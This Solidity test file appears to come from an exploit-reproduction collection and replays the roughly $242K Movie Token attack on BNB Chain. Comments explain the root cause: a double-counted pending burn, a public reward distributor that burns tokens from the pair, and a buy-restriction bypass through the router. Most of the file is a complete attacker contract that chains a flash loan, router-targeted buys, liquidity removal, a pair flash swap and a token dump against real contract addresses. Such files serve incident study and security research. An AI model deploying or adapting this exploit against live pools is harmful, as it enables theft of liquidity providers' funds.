// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "../basetest.sol";

// @KeyInfo - Total Lost : ~$242K (~381.7 WBNB)
// Attacker        : https://bscscan.com/address/0xDB0901A3254f47c0CE57fFFCE2C730Bc33A1c0e1
// Attack Contract : https://bscscan.com/address/0xDf7eD22d1FA65eAc11A0806b7bb5F35d4A1e957D
// Vulnerable      : https://bscscan.com/address/0xb32979f3a5b426a4a6ae920f2b391d885abf4c18 (Movie Token / MT)
// Pair            : https://bscscan.com/address/0x037E6EB26275DBfE3A5244239BBe973f1A56b449 (MT/WBNB)
// LP Mining       : https://bscscan.com/address/0x139bd2ECFDE76f5311D7beeb2E05cba6feDE26D6
// Flash provider  : https://bscscan.com/address/0x8F73b65B4caAf64FBA2aF91cC5D4a2A1318E5D8C (Moolah)
// Attack Tx       : https://bscscan.com/tx/0xfb57c980286ea8755a7b69de5a74483c44b1f74af4ab34b7c52e733fc62dfca6
//
// @Analysis
// CertiK  : https://www.certik.com/blog/movie-token-incident-analysis
// Defimon : https://x.com/DefimonAlerts/status/2031324036181954842
//
// Root cause:
//  Sell path double-counts: net MT is sent to the pair for the swap AND the same net is
//  added to pendingBurnAmount. Public LP-mining distributeDailyRewards() then
//  extractFromPoolForLpMining → burns pending from the pair balance + sync(), collapsing
//  MT reserves while WBNB stays. Remaining MT dumps drain WBNB.
//
// Buy restriction bypass (from cast run of live attack):
//  Open market buys to arbitrary EOAs revert ("Buying not allowed... LP mining").
//  Buys *to the PancakeRouter* succeed; removeLiquidityETHSupportingFeeOnTransferTokens
//  then flushes the router's entire MT balance to the attacker.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
}

interface IPancakeRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountETH);

    function getAmountsIn(uint256 amountOut, address[] calldata path) external view returns (uint256[] memory amounts);
    function getAmountsOut(uint256 amountIn, address[] calldata path) external view returns (uint256[] memory amounts);
}

interface IPancakePair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112, uint112, uint32);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function mint(address to) external returns (uint256 liquidity);
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface ILPMining {
    function distributeDailyRewards() external;
}

interface IMoolahFlash {
    function flashLoan(address token, uint256 assets, bytes calldata data) external;
}

/// @dev Standalone attacker implementing the live on-chain sequence (simplified capital via deal).
contract MovieAttacker {
    address constant MT = 0xb32979f3A5b426a4A6Ae920f2B391D885Abf4C18;
    address constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address constant PAIR = 0x037E6EB26275DBfE3A5244239BBe973f1A56b449;
    address constant ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address constant LP_MINING = 0x139bd2ECFDE76f5311D7beeb2E05cba6feDE26D6;
    address constant MOOLAH = 0x8F73b65B4caAf64FBA2aF91cC5D4a2A1318E5D8C;

    uint256 constant TINY_MT = 0.2 ether; // 2e17 — same seed size as live attack
    uint256 constant BIG_MT = 10_000_000 ether; // 1e25

    address public owner;
    bool internal inPairFlash;

    constructor() {
        owner = msg.sender;
    }

    receive() external payable {}

    function attack() external {
        // Prefer real Moolah flash if funded; else fall back to pre-dealt WBNB on this contract
        uint256 moolahBal = IERC20(WBNB).balanceOf(MOOLAH);
        if (moolahBal > 100_000 ether) {
            uint256 loan = moolahBal; // use full available like live (~358k)
            IMoolahFlash(MOOLAH).flashLoan(WBNB, loan, abi.encode(loan));
        } else {
            _core(IERC20(WBNB).balanceOf(address(this)));
        }
        // Send profits to owner (test contract)
        uint256 w = IERC20(WBNB).balanceOf(address(this));
        if (w > 0) IERC20(WBNB).transfer(owner, w);
    }

    /// Moolah callback — provider pulls repayment after return (approve only)
    function onMoolahFlashLoan(uint256 assets, bytes calldata) external {
        require(msg.sender == MOOLAH || msg.sender == address(0x9321587EA0DC8247f8F03E8696C047b2713bB79A), "only moolah");
        _core(assets);
        IERC20(WBNB).approve(MOOLAH, type(uint256).max);
        IERC20(WBNB).approve(msg.sender, type(uint256).max);
    }

    /// Pancake pair flash callback — repay borrowed WBNB with MT (records pendingBurn)
    function pancakeCall(address, uint256, uint256 amount1, bytes calldata) external {
        require(msg.sender == PAIR, "only pair");
        inPairFlash = true;
        uint256 mtBal = IERC20(MT).balanceOf(address(this));
        // Transfer all MT into pair as sell repayment → PendingBurnRecorded on net
        IERC20(MT).transfer(PAIR, mtBal);
        inPairFlash = false;
        // amount1 is WBNB borrowed; K-check uses MT we just sent
        amount1; // silence
    }

    function _core(uint256 /*wbnbCapital*/) internal {
        IERC20(WBNB).approve(ROUTER, type(uint256).max);
        IERC20(MT).approve(ROUTER, type(uint256).max);

        // --- 1) Tiny MT buy via direct pair.swap (allowed for small first touch) ---
        address[] memory path = new address[](2);
        path[0] = WBNB;
        path[1] = MT;
        uint256[] memory amtsIn = IPancakeRouter(ROUTER).getAmountsIn(TINY_MT, path);
        IERC20(WBNB).transfer(PAIR, amtsIn[0]);
        // token0=MT, token1=WBNB → amount0Out = TINY_MT
        IPancakePair(PAIR).swap(TINY_MT, 0, address(this), "");

        // --- 2) Seed tiny LP (MT + matching WBNB) so removeLiquidity can flush router ---
        uint256 mtTiny = IERC20(MT).balanceOf(address(this));
        IERC20(MT).transfer(PAIR, mtTiny);
        IERC20(WBNB).transfer(PAIR, amtsIn[0]);
        IPancakePair(PAIR).mint(address(this));

        // --- 3) Large buy TO ROUTER (bypasses "buying not allowed" for EOAs) ---
        _buyToRouter(BIG_MT);

        // --- 4) removeLiquidity flushes router MT balance to us ---
        uint256 lpBal = IPancakePair(PAIR).balanceOf(address(this));
        IPancakePair(PAIR).approve(ROUTER, type(uint256).max);
        IPancakeRouter(ROUTER).removeLiquidityETHSupportingFeeOnTransferTokens(
            MT, lpBal / 2, 0, 0, address(this), block.timestamp + 1
        );

        // --- 5) Pair flash: borrow WBNB; pancakeCall dumps MT into pair (pendingBurn) ---
        // Live attack borrowed ~397.3 WBNB (not 90% of reserves) so K holds after fee-on-transfer.
        (uint112 r0, uint112 r1,) = IPancakePair(PAIR).getReserves();
        r0; // silence
        uint256 borrowWbnb = 397_326_111_698_973_246_236;
        if (borrowWbnb >= uint256(r1)) {
            borrowWbnb = uint256(r1) * 45 / 100;
        }
        IPancakePair(PAIR).swap(0, borrowWbnb, address(this), hex"01");

        // --- 6) Second large buy TO ROUTER + flush remaining LP ---
        _buyToRouter(BIG_MT);
        lpBal = IPancakePair(PAIR).balanceOf(address(this));
        if (lpBal > 0) {
            IPancakeRouter(ROUTER).removeLiquidityETHSupportingFeeOnTransferTokens(
                MT, lpBal, 0, 0, address(this), block.timestamp + 1
            );
        }

        // --- 7) Burn pending from pair via public distributor ---
        ILPMining(LP_MINING).distributeDailyRewards();

        // --- 8) Dump remaining MT at inflated price ---
        uint256 mtLeft = IERC20(MT).balanceOf(address(this));
        if (mtLeft > 0) {
            address[] memory sellPath = new address[](2);
            sellPath[0] = MT;
            sellPath[1] = WBNB;
            IPancakeRouter(ROUTER).swapExactTokensForTokensSupportingFeeOnTransferTokens(
                mtLeft, 0, sellPath, address(this), block.timestamp
            );
        }
    }

    function _buyToRouter(uint256 mtOutDesired) internal {
        address[] memory path = new address[](2);
        path[0] = WBNB;
        path[1] = MT;
        uint256[] memory amts = IPancakeRouter(ROUTER).getAmountsIn(mtOutDesired, path);
        uint256 wbnbIn = amts[0];
        // leave headroom
        uint256 have = IERC20(WBNB).balanceOf(address(this));
        if (wbnbIn > have * 95 / 100) wbnbIn = have * 95 / 100;
        if (wbnbIn == 0) return;
        IPancakeRouter(ROUTER).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            wbnbIn, 0, path, ROUTER, block.timestamp
        );
    }
}

contract MovieToken_exp is BaseTestWithBalanceLog {
    address constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address constant MOOLAH = 0x8F73b65B4caAf64FBA2aF91cC5D4a2A1318E5D8C;

    uint256 constant ATTACK_BLOCK = 85_677_691;
    uint256 constant FORK_BLOCK = ATTACK_BLOCK - 1;

    function setUp() public {
        vm.createSelectFork("http://127.0.0.1:8546", FORK_BLOCK);
        fundingToken = WBNB;
        vm.label(0xb32979f3A5b426a4A6Ae920f2B391D885Abf4C18, "MT");
        vm.label(0x037E6EB26275DBfE3A5244239BBe973f1A56b449, "PAIR");
        vm.label(0x139bd2ECFDE76f5311D7beeb2E05cba6feDE26D6, "LP_MINING");
        vm.label(MOOLAH, "MOOLAH");
    }

    function testExploit() public balanceLog {
        MovieAttacker attacker = new MovieAttacker();
        // If moolah flash path fails on interface mismatch, pre-fund attacker with deal capital
        uint256 moolahBal = IERC20(WBNB).balanceOf(MOOLAH);
        if (moolahBal < 100_000 ether) {
            deal(WBNB, address(attacker), 400_000 ether);
        }
        attacker.attack();

        uint256 profit = IERC20(WBNB).balanceOf(address(this));
        console.log("Profit WBNB wei:", profit);
        // Live profit ~381.7 WBNB; accept any material profit as SC proof
        assertGt(profit, 50 ether);
    }
}
